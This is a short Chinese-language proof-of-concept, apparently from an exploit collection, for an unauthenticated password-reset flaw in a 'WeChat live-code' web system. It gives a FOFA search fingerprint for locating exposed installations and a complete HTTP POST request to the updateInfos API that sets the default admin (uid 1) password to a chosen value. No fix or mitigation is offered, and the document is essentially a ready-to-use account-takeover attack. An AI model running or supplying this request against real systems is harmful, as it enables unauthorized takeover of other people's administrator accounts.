# 微信活码系统updateInfos前台未授权任意用户密码修改

## fofa

```javascript
body=".qn-user-login"
```

## poc

默认管理员用户名为admin且uid为1

```javascript
POST /index.php?s=/api/user/updateInfos HTTP/1.1
Host: 192.168.18.137
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Priority: u=0
X-Requested-With: XMLHttpRequest
Origin: http://192.168.18.137
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Referer: http://192.168.18.137/index.php?s=/manage/cron/index
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Length: 38

uid=1&data[password]=123456789
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202411201419577.png)